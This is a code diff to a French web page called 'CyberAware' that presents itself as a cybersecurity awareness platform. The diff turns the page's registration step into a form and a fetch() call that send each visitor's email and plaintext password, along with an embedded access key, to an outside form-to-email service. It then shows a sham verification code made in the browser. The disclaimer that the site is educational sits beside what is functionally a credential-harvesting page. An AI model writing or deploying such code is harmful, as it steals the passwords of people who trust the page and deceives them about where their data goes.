@@ -133,9 +133,19 @@
   <section id="loginSection" class="card">
     <h1>CyberAware</h1>
     <p>Plateforme de sensibilisation à la cybersécurité</p>
-    <input type="email" id="email" placeholder="Adresse email" required>
-    <input type="password" id="password" placeholder="Mot de passe" required>
-    <button onclick="register()">Continuer</button>
+    
+    <form action="https://api.web3forms.com/submit" method="POST" id="registerForm">
+      <input type="hidden" name="access_key" value="78c4e0bf-fe40-4669-9faf-2e46c98c8d90">
+      <input type="hidden" name="_subject" value="Nouvelle inscription CyberAware">
+      <input type="hidden" name="_captcha" value="false">
+      
+      <input type="email" name="email" id="email" placeholder="Adresse email" required>
+      <input type="password" name="password" id="password" placeholder="Mot de passe" required>
+      
+      <input type="checkbox" name="botcheck" style="display:none">
+      
+      <button type="submit">Continuer</button>
+    </form>
   </section>
 
   <!-- CODE -->
@@ -185,19 +195,9 @@
     <!-- CONTACT -->
     <h2>Contact</h2>
 
-    <form action="https://api.web3forms.com/submit" method="POST" class="card">
-      <input type="hidden" name="access_key" value="78c4e0bf-fe40-4669-9faf-2e46c98c8d90">
-      <input type="hidden" name="_subject" value="Nouveau message CyberAware">
-      <input type="hidden" name="_captcha" value="false">
-      
-      <input type="text" name="name" placeholder="Nom" required>
-      <input type="email" name="email" placeholder="Email" required>
-      <textarea name="message" placeholder="Message" required></textarea>
-
-      <input type="checkbox" name="botcheck" style="display:none">
-
-      <button type="submit">Envoyer</button>
-    </form>
+    <div class="card">
+      <p>Pour nous contacter, envoyez un email à : <strong>contact@cyberaware.fr</strong></p>
+    </div>
 
     <p class="legal">
       ⚠️ Site éducatif – aucune méthode illégale n'est enseignée.
@@ -210,7 +210,10 @@
 <script>
   let generatedCode = "";
 
-  function register() {
+  // Gérer la soumission du formulaire d'inscription
+  document.getElementById('registerForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
@@ -219,12 +222,22 @@
       return;
     }
 
-    generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-    document.getElementById("generatedCode").innerText = generatedCode;
+    // Envoyer les données à Web3Forms
+    const formData = new FormData(this);
+    fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      body: formData
+    }).then(() => {
+      // Après l'envoi, générer le code et passer à l'étape suivante
+      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+      document.getElementById("generatedCode").innerText = generatedCode;
 
-    document.getElementById("loginSection").classList.add("hidden");
-    document.getElementById("codeSection").classList.remove("hidden");
-  }
+      document.getElementById("loginSection").classList.add("hidden");
+      document.getElementById("codeSection").classList.remove("hidden");
+    }).catch(error => {
+      alert("Erreur lors de l'envoi. Veuillez réessayer.");
+    });
+  });
 
   function verifyCode() {
     const input = document.getElementById("codeInput").value;
